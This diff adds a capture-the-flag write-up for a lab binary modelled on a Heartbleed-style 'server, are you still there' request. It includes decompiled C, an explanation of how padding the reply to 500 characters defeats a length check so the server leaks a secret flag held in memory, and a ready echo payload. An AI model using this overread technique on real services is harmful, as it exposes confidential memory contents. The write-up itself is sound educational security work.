@@ -1,0 +1,82 @@
+=== Personal solution description ===
+
+Analysing the program we see it's a statically linked, simple binary. It takes a line of text and compares it with its internal "request" syntax.
+------------------------------------------------------------
+	undefined8 main(void)
+	{
+	  int iVar1;
+	  char *str;
+	  size_t sVar2;
+	  ulong uVar3;
+	  undefined local_38 [4];
+	  int letter_num;
+	  char *str2;
+	  char *input;
+	  FILE *local_20;
+	  
+	  setvbuf((FILE *)stdout,(char *)0x0,2,0);
+	  setvbuf((FILE *)stdin,(char *)0x0,2,0);
+	  bzero(globals + 0x200,0x100);
+	  local_20 = fopen64("flag","r");
+	  if (local_20 == (FILE *)0x0) {
+		puts("Could not open the flag.");
+		return 0xffffffff;
+	  }
+	  fread(globals + 0x200,1,0x100,local_20);
+	  while( true ) {
+		iVar1 = fgetln(stdin,local_38);
+		input = (char *)(long)iVar1;
+		str = strtok(input,"?");
+		str2 = (char *)(long)(int)str;
+		iVar1 = cmp(str2,"SERVER, ARE YOU STILL THERE");
+		if (iVar1 != 0) {
+		  puts("MALFORMED REQUEST");
+						/* WARNING: Subroutine does not return */
+		  exit(-1);
+		}
+		str = strtok((char *)0x0,"\"");
+		str2 = (char *)(long)(int)str;
+		iVar1 = cmp(str2," IF SO, REPLY ");
+		if (iVar1 != 0) break;
+		str = strtok((char *)0x0,"\"");
+		str2 = (char *)(long)(int)str;
+		sVar2 = strlen(str2);
+		memcpy(globals,str2,sVar2);
+		str = strtok((char *)0x0,"(");
+		str2 = (char *)(long)(int)str;
+		str = strtok((char *)0x0,")");
+		str2 = (char *)(long)(int)str;
+		__isoc99_sscanf(str2,"%d LETTERS",&letter_num);
+		globals[letter_num] = 0;
+		uVar3 = (ulong)letter_num;
+		sVar2 = strlen(globals);
+		if (sVar2 < uVar3) {
+		  puts("NICE TRY");
+						/* WARNING: Subroutine does not return */
+		  exit(-1);
+		}
+		puts(globals);
+	  }
+	  puts("MALFORMED REQUEST");
+						/* WARNING: Subroutine does not return */
+	  exit(-1);
+	}
+------------------------------------------------------------
+
+It seems like the message has to be of format:
+	SERVER, ARE YOU STILL THERE? IF SO, REPLY "MESSAGE" (X LETTERS)
+Where MESSAGE is what the server will reply and X is the number of letters the reply will have. It has a check in place to make sure you're not trying to have a longer reply than you wrote in the message:
+------------------------------------------------------------
+    uVar3 = (ulong)letter_num;
+    sVar2 = strlen(globals);
+	if (sVar2 < uVar3) {                 
+		   puts("NICE TRY");                  
+		   exit(-1);                          
+	}       
+------------------------------------------------------------
+
+The variable globals has around 700 characters. The flag is read from the file and written in globals buffer, at index 500. The rest of the buffer is filled with zeroes, using the bzero() function. This will ensure the strlen used in the check above will use the size of the string up to the first 0 found, so in theory the message you're asking the server to reply with.
+But what happens if you write a 500 character reply, effectively overwriting all zeroes until the position where the flag is written? Well the server replies with the whole string, including the flag, because of the puts() call. It also bypasses the checks, because now the strlen() call will include the size of the flag.
+
+So, in the end, it's as simple as:
+	$ echo -ne 'SERVER, ARE YOU STILL THERE? IF SO, REPLY "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" (530 LETTERS)' | ./xkcd
